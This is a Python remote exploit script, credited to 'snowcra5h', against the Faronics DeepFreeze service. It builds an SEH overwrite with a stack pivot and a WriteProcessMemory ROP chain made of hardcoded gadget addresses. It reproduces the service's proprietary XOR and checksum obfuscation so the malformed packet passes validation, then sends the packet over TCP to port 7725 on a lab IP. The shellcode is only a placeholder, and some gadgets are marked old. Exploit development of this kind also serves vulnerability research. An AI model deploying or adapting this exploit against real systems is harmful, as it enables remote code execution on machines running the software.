"""
 Faronics DeepFreeze SEH Remote Exploit

    ██████  ███▄    █  ▒█████   █     █░ ▄████▄   ██▀███   ▄▄▄        ██████  ██░ ██
  ▒██    ▒  ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒
  ░ ▓██▄   ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█ ▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░
    ▒   ██▒▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█ ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██   ▒   ██▒░▓█ ░██
  ▒██████▒▒▒██░   ▓██░░ ████▓▒░░░██▒██▓ ▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓
  ▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒  ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
  ░ ░▒  ░ ░░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░    ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░
  ░  ░  ░     ░   ░ ░ ░ ░ ░ ▒    ░   ░  ░          ░░   ░   ░   ▒   ░  ░  ░   ░  ░░ ░
        ░           ░     ░ ░      ░    ░ ░         ░           ░  ░      ░   ░  ░  ░
                                    Written by: snowcra5h@icloud.com (snowcra5h) 2023
"""

import socket, struct, ctypes

bad_chars = [0, 0xa, 0xd, 0x2b, 0x25, 0x26, 0x3d]

DEBUG       = False
LOW_QWORD   = 1
HIGH_QWORD  = 0

qword_9ED208 = [0, 0] # dq 009ed208 L1 ; global rand value


def get_seh_overwrite() -> bytes:
    offset_to_call = 3632
    offset_to_ropchain = 20
    offset_to_eip = 3756

    seh_gadgets = {
        "popad ; salc ; cld ; call  [eax-0x18]; (6224cf)" : struct.pack("<L", 0x6224cf),
        "xchg eax, esp ; ret ; (441ec6)" : struct.pack('<L', 0x441ec6),
        "add esp, 0x000000BC ; ret ; (62374f)" : struct.pack('<L', 0x62374f), 
    }

    # This is where we jump to after call [eax-0x18] ; we will xchg eax for esp so we can pivot to a rop chain
    seh_chain = b'A' * offset_to_call
    seh_chain += seh_gadgets["xchg eax, esp ; ret ; (441ec6)"]

    # this offsets our stack to our ropchain
    seh_chain += b'B' * offset_to_ropchain
    seh_chain += seh_gadgets["add esp, 0x000000BC ; ret ; (62374f)"]

    # set up the stack for our ropchain to WriteProcessMemory [this is where PPR would typically go]
    seh_chain += b'C' * ((offset_to_eip - len(seh_chain)) - 4)
    seh_chain += seh_gadgets["xchg eax, esp ; ret ; (441ec6)"] # (nseh)
    seh_chain += seh_gadgets["popad ; salc ; cld ; call  [eax-0x18]; (6224cf)"] # EIP
    seh_chain += b"\x90" * 24 # there are bad bytes that this overwrites

    return seh_chain


def get_wpm_ropchain() -> bytes:
    """
        -------------------------------
        BOOL WriteProcessMemory(
          HANDLE  hProcess,
          LPVOID  lpBaseAddress,
          LPCVOID lpBuffer,
          SIZE_T  nSize,
          SIZE_T  *lpNumberOfBytesWritten
        );
        -------------------------------
    """
    skeleton  = struct.pack("<L", 0x41414141) # WriteProcessMemory address
    skeleton += struct.pack("<L", 0x42424242) # shellcode return address to return to after WriteProcessMemory is called
    skeleton += struct.pack("<L", 0xffffffff) # hProcess (pseudo Process handle)
    skeleton += struct.pack("<L", 0x44444444) # lpBaseAddress (Code cave address)
    skeleton += struct.pack("<L", 0x45454545) # lpBuffer (shellcode stack address)
    skeleton += struct.pack("<L", 0x46464646) # nSize (size of shellcode)
    skeleton += struct.pack("<L", 0x47474747) # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE; address just past size value +0x4)
    skeleton += b"\x90" * 36 # 36 bytes is the distance between our stub and where our ropchain continues.

    # Start of our ropchain
    rop_gadgets = {
        # write what where
        "mov dword ptr [eax], ecx; ret;" : struct.pack("<L", 0x00762cb7),

        # arithmetic
        "sub eax, ecx; ret;" : struct.pack("<L", 0x006654c2),
        "neg eax; ret;" : struct.pack("<L", 0x006bc6f5),

        # get next skeleton offset gadgets
        "inc eax; ret;" : struct.pack("<L", 0x0044bd6c),

        # mov skeleton address for arithmetic
        "mov eax, esi; pop esi; ret;" : struct.pack("<L", 0x5721a6),
        "xchg esi, eax; ret;" : struct.pack("<L", 0x004e8662),
        "xchg ecx, eax; ret;" : struct.pack("<L", 0x0063c33e),
        "mov eax, ecx; ret;" : struct.pack("<L", 0x005b63d9),

        # pop for arithmetic
        "pop eax; ret;" : struct.pack("<L", 0x004d76f4),
        "pop ecx; ret;" : struct.pack("<L", 0x4a55fb),
        "pop esi ; ret;" : struct.pack('<L', 0x4b7c19),

        # push for next skeleton address
        "push esp ; pop esi ; ret;" : struct.pack('<L', 0x5d13eb),
        "push eax ; inc esp ; pop esi ; ret;" : struct.pack('<L', 0x525966),
        "dec esp; ret;" : struct.pack("<L", 0x0047aeff),

        # return to esp
        "xchg esp, eax; ret;" : struct.pack("<L", 0x00441ec6),

        # constant hardcoded
        "relative nSize offset to WriteProcessMemory" : struct.pack("<L", (0xffffffec)), # -0x14
	    "-size of shellcode" : struct.pack("<L", (0xfffffdf4)), # -524
        "junk" : struct.pack("<L", 0xdeadbeef),

        # variable hardcoded
        "relative lpBuffer offset from shellcode" : struct.pack("<L", (0xfffffee0)), # -288
        "first shellcode address offset to be added" : struct.pack("<L", (0x77777878)), 
	    "second shellcode address offset to be added" : struct.pack("<L", (0x88888888)), 

        # OLD
        "mov ecx,  [ecx] ; mov  [eax], ecx ; pop ebp ; ret;" : struct.pack("<L", 0x7cdbd5),
        "add eax, ecx ; pop ecx ; pop ebp ; ret ;" : struct.pack("<L", 0x476b06),
    }

    # offset EAX to the start of our dummy driver
    rop = skeleton + rop_gadgets["push esp ; pop esi ; ret;"]
    rop += rop_gadgets["push esp ; pop esi ; ret;"] # 
    rop += rop_gadgets["mov eax, esi; pop esi; ret;"] # EAX = ESP
    rop += rop_gadgets["junk"]
    rop += rop_gadgets["pop ecx; ret;"]
    rop += struct.pack("<L", 0xffffffb0 + 0xc)  # ECX = -68
    rop += rop_gadgets["add eax, ecx ; pop ecx ; pop ebp ; ret ;"]
    rop += rop_gadgets["junk"]
    rop += rop_gadgets["junk"]

    # Obtain the WriteProcessMemory VMA
    rop += rop_gadgets["pop ecx; ret;"]
    rop += struct.pack("<L", 0x00a50644)
    rop += rop_gadgets["mov ecx,  [ecx] ; mov  [eax], ecx ; pop ebp ; ret;"]
    rop += rop_gadgets["junk"]
    # 0x40242a: pop edi ; ret ; (1 found)
    # fffd4010
    # 0x622fbc: add edi, esi ; ret ; (1 found)

    return rop

def get_shellcode() -> bytes:
    sc  = b"\x90" * 16
    sc += b"A"*520
    sc += b"\x90" * 16

    return sc


def build_exploitchain(szmax_expchain) -> bytes:
    # create exploit chain
   
    seh = get_seh_overwrite()
    rop = get_wpm_ropchain()
    shellcode = get_shellcode()
   
    exploit_chain = seh + rop + shellcode
    sz_expchain = len(exploit_chain)
    padding = b'\x90' * (szmax_expchain - sz_expchain)

    payload = exploit_chain + padding

    return payload


def seed_rng(seed_value):
    global qword_9ED208
    qword_9ED208[HIGH_QWORD] = seed_value
    qword_9ED208[LOW_QWORD] = 0
    return __get_next_rng()


def __get_next_rng():
    global qword_9ED208
    qword_9ED208[HIGH_QWORD] = ctypes.c_uint32(qword_9ED208[HIGH_QWORD] * 0x15A4E35 + 1).value
    return (qword_9ED208[HIGH_QWORD] >> 16) & 0x7FFF


def get_large_random():
    global qword_9ED208

    EDX = EAX = ESI = EBX = EDX = ECX = 0
    EBX = ctypes.c_uint32(qword_9ED208[LOW_QWORD]).value# mov ebx, dword ptr qword_9ED208+4
    ESI = ctypes.c_uint32(qword_9ED208[HIGH_QWORD]).value# mov esi, dword ptr qword_9ED208
    EAX = EBX# mov eax, ebx
    ECX = ctypes.c_uint32(0x15A).value# mov ecx, 15Ah
    EBX = ctypes.c_uint32(0x4E35).value# mov ebx, 4E35h
    if EAX != 0:
        EDX = ctypes.c_uint32((EAX * EBX) >> 32).value
        EAX = ctypes.c_uint32(EAX * EBX).value
    temp = ctypes.c_uint32(EAX).value # xchg eax, ecx
    EAX  = ctypes.c_uint32(ECX).value # xchg eax, ecx
    ECX  = ctypes.c_uint32(temp).value # xchg eax, ecx
    EDX  = ctypes.c_uint32((EAX * ESI) >> 32).value # Store high bits in EDX for multiplication
    EAX  = ctypes.c_uint32(EAX * ESI).value # mul esi
    EAX  = ctypes.c_uint32(EAX + ECX).value # add eax, ecx
    temp = ctypes.c_uint32(EAX).value # xchg eax, esi
    EAX  = ctypes.c_uint32(ESI).value # xchg eax, esi
    ESI  = ctypes.c_uint32(temp).value # xchg eax, esi
    EDX  = ctypes.c_uint32((EAX * EBX) >> 32).value # Store high bits in EDX for multiplication
    EAX  = ctypes.c_uint32(EAX * EBX).value # mul ebx
    EDX  = ctypes.c_uint32(EDX + ESI).value # add edx, esi
    SF   = ctypes.c_uint8(int(bool((EAX+1) & 0x80000000))).value # sign flag
    EAX  = ctypes.c_uint32(EAX + 1).value # add eax, 1
    CF   = ctypes.c_uint8(int(bool((EAX+1) & 0x80000000)) ^ SF).value # carry flag
    EDX  = ctypes.c_uint32(EDX + CF).value # adc edx, 0
    EBX  = ctypes.c_uint32(EAX).value # mov ebx, eax
    ESI  = ctypes.c_uint32(EDX).value # mov esi, edx
    qword_9ED208[HIGH_QWORD] = ctypes.c_uint32(EBX).value # mov dword ptr qword_9ED208, ebx
    qword_9ED208[LOW_QWORD]  = ctypes.c_uint32(ESI).value # mov dword ptr qword_9ED208+4, esi
    EAX = ctypes.c_uint32(ESI).value # mov eax, esi
    EAX = ctypes.c_uint32(EAX & 0x7fffffff).value # and eax, 7fffffffh
    ESI = EBX = 0 # For debugging
    return EAX


def decrypt_bytes(BUFFER_LEN, BUFFER, SEED_VALUE=0x037ba4d4):
    global EDX_GLOBAL

    if BUFFER_LEN == 0:
        return

    STORED_BUFFER = list(BUFFER) # Convert bytes to list of integers
    XOR_KEY = 0
    
    seed_rng(SEED_VALUE) # call seed_rng
    for i in range(BUFFER_LEN):
        XOR_KEY = ctypes.c_uint8(get_large_random() % 256).value
        XOR_VAL = ctypes.c_uint8(STORED_BUFFER[i]).value
        STORED_BUFFER[i] = ctypes.c_uint8(XOR_KEY ^ XOR_VAL).value

        if DEBUG:
            print(f'[{i:04}]: {hex(XOR_VAL)[2:]:02} ^ {hex(XOR_KEY)[2:]:02} = {hex(STORED_BUFFER[i])[2:]:02}')

    return bytes(STORED_BUFFER) # Convert back to bytes


def generate_checksum_value(checkval):
    EBX = EDX = ECX = EAX = 0
    EAX = ctypes.c_uint32(checkval).value # mov eax, dword ptr [ebp+0ch]
    ECX = ctypes.c_uint16(0x00b1).value # mov ecx, 0b1h
    EDX = 0 # xor edx, edx
    EDX = ctypes.c_uint32(EAX % ECX).value # EDX = remainder
    EAX = ctypes.c_uint32(int(EAX / ECX)).value # EAX = dividend and quotient
    ECX = ctypes.c_int32(EDX * 0x00ab).value # imul ecx, edx, 0abh
    EAX = ctypes.c_uint32(checkval).value # mov eax, dword ptr [ebp+0ch]
    EBX = ctypes.c_uint16(0x00b1).value # mov ebx, 0b1h
    EDX = 0 # xor edx, edx
    EDX = ctypes.c_uint32(EAX % EBX).value # EDX = remainder
    EAX = ctypes.c_uint32(int(EAX / EBX)).value # EAX = quotient && dividend
    EAX = ctypes.c_uint32(EAX + EAX).value # add eax, eax
    ECX = ctypes.c_uint32(ECX - EAX).value # sub ecx, eax 
    result = ECX # mov dword ptr [ebp+result], ecx
    AX = ctypes.c_uint16(result).value # mov ax, word ptr [ebp - 4]
    AX = ctypes.c_uint16(AX & 0x7fff).value # and ax, 7fffh
    EAX = ctypes.c_uint32(EAX & 0xFFFF0000).value # ... test val
    EAX = ctypes.c_uint32(EAX | AX).value # ... test val
    return AX # retn


def deobfuscate_buffer_with_checksum(initial_checksum, buffer, buffer_len) -> bytes:
    if buffer_len == 0:
        return buffer

    buf = list(buffer) # Convert bytes to list of integers

    checksum = generate_checksum_value(initial_checksum)

    for i in range(buffer_len):
        checksum = generate_checksum_value(checksum)
        buf[i] = ctypes.c_uint8(buf[i] ^ checksum).value

    return bytes(buf) # Convert back to bytes


def ps_command_buffer_checksum(buffer, size):
    EBX = buffer # base pointer for memory addresses pointing to buffer 
    EAX = 0 # accumulator return value
    ECX = 0 # counter for loop

    for ECX in range (size):
        EAX = ctypes.c_int32(EAX << 4).value # shl eax, 4
        EDX = 0 # xor edx, edx
        EDX = ctypes.c_uint8(EBX[ECX]).value # mov dl, [ebx]
        EAX = ctypes.c_uint32(EAX+EDX).value # add eax, edx
        EDX = EAX # mov edx, eax
        EDX = EDX & 0xF0000000 # and edx, 0xf0000000
        if EDX != 0:
            ESI = EDX # mov esi, edx
            ESI = ESI >> 24 # shr esi, 18h
            EAX = ctypes.c_uint32(EAX^ESI).value # xor eax, esi
        EDX = ctypes.c_uint32(~EDX).value # not edx
        EAX = ctypes.c_uint32(EAX&EDX).value # and eax, edx

    return ctypes.c_int32(EAX).value
    

def build_command_header(SZ) -> bytes:
    sz = struct.pack("<L", SZ)
    ps_command_header =  struct.pack("<L", 0x44444444)  # no clue
    ps_command_header += struct.pack("<L", 0x14)        # This is the offset of memory where we have our buffer
    ps_command_header += struct.pack("<L", 0x0A958)     # This is the third checksum
    ps_command_header += struct.pack("<L", 0x0C9)       # OPCODE FOUR used as the opcode for branching
    ps_command_header += sz + sz

    return ps_command_header

def get_payload_sz(cb_command_buffer):
    num_opcodes = 4
    bytes_per_opcode  = 4
    sz = (num_opcodes * bytes_per_opcode) + cb_command_buffer

    return sz


def build_command_buffer(ps_command_agent: bytes, buffer: bytes, cb_command_buffer) -> bytes:
    buffer_list = list(buffer[4:])
    cbuf_checksum = ps_command_buffer_checksum(buffer_list, cb_command_buffer - 4)
    ps_command_buffer = struct.pack("<L", cbuf_checksum) + bytes(buffer_list)

    if DEBUG:
        print("\nps_command_buffer")
        print_debug(ps_command_buffer)
        print("end: ps_command_buffer\n")
        print(f"checkvalue: {hex(cbuf_checksum)}")

    return ps_command_agent + ps_command_buffer


def build_command_agent(sz_payload, cb_command_buffer) -> bytes:
    encode = struct.pack("<L", 0x010795ef) # checksum needed by second encryption
    cb_command_agent = sz_payload - cb_command_buffer # used as an offset to the ps_command_buffer
    cb_header = struct.pack("<L", cb_command_agent) # cb_header + cb_buffer need to == cb_buffer
    checksum = struct.pack("<L", 0x0000A953) # checksum value that comes after the encryption routines
    cb_com_buf = struct.pack("<L", cb_command_buffer) # 3 values are checked in an if statement after the encryption
    ps_command_agent = encode + cb_header + checksum + cb_com_buf

    if DEBUG:
        print("\nps_command_agent")
        print_debug(ps_command_agent)
        print("end: ps_command_agent\n")

    return ps_command_agent


def phase_one_encryption(ps_command_buffer) -> bytes:
    buf = ps_command_buffer[4:]
    icvec = buf[:4]
    buf_len = len(buf)
    initial_checksum = ctypes.c_uint32(
            icvec[3] << 24 | icvec[2] << 16 | icvec[1] << 8 | icvec[0] << 0
        ).value
    phase_one_encrypted = struct.pack("<L", initial_checksum) + deobfuscate_buffer_with_checksum(initial_checksum, buf, buf_len)

    if DEBUG:
        print("phase_one_encrypted")
        print(f"checksum:\t{hex(initial_checksum)}")
        print_debug(phase_one_encrypted)
        print("enc: phase_one_encrypted\n")

    return phase_one_encrypted

def phase_two_encryption(phase_one_encrypted) -> bytes:
    size_phase_one = len(phase_one_encrypted)
    phase_two_encrypted = decrypt_bytes(size_phase_one, phase_one_encrypted)
    
    if DEBUG:
        print("phase_two_encrypted")
        print_debug(phase_two_encrypted)
        print("end phase_two_encrypted\n")

    return phase_two_encrypted

def do_two_phase_encryption(ps_command_buffer) -> bytes:
    phase_one_encrypted = phase_one_encryption(ps_command_buffer)
    phase_two_encrypted = phase_two_encryption(phase_one_encrypted)

    return phase_two_encrypted

def build_payload():
    cb_command_buffer = 7100

    sz_payload = get_payload_sz(cb_command_buffer)
    ps_command_header = build_command_header(sz_payload)
    szmax_expchain = cb_command_buffer - len(ps_command_header)
    exploit_chain = build_exploitchain(szmax_expchain)
    header_and_chain = ps_command_header + exploit_chain
    ps_command_agent = build_command_agent(sz_payload, cb_command_buffer)
    ps_command_buffer = build_command_buffer(ps_command_agent, header_and_chain, cb_command_buffer)
    encrypted_command_buffer = do_two_phase_encryption(ps_command_buffer)
    sz_everything = struct.pack('>L', sz_payload)
    payload = sz_everything + encrypted_command_buffer

    if DEBUG:
        print("payload")
        print_debug(payload)
        print("end payload") 

    return payload


def tcp_recv(client: socket):
    response = client.recv(4096) 
    print('[*] response:\n')
    print(response.hex())


def send_exploit(buffer: bytes, target_host, target_port, udp = False):

    if udp:
        print("[+] Creating UDP Socket")
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        client.sendto(buffer, (target_host, target_port))
        print(f'[+] sent {len(buffer)} bytes')

        resp, addr = client.recvfrom(4096)
        print('[*] response:\n')
        print(resp)

    else:
        print("[+] Creating TCP Socket")
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_host, target_port))

        # we need to get the initial blob of what ever the server is sending
        n_reads = 2
        while n_reads:
            tcp_recv(client)
            n_reads -= 1

        print(f"[+] Server Awaits Data")

        client.send(buffer)
        print(f'[+] sent {len(buffer)} bytes')

        client.send(buffer)
        # tcp_recv(client)


def print_debug(ENCRYPTED):
    count = 0
    for i in ENCRYPTED:
        if count % 16 == 0:
            print(f"{count:04}:\t\t", end = "")
        count = count + 1
        print(f"{hex(i)[2:]:2}", end = "")
        if count % 16 == 0:
            print("")
        elif count % 8 == 0:
            print("", end = "-")
        else:
            print("", end = " ")
    print("...")


def main():
    ip = '192.168.152.10'
    port = 7725

    payload = build_payload()
    send_exploit(payload, ip, port, False)

if __name__ == '__main__':
    main()
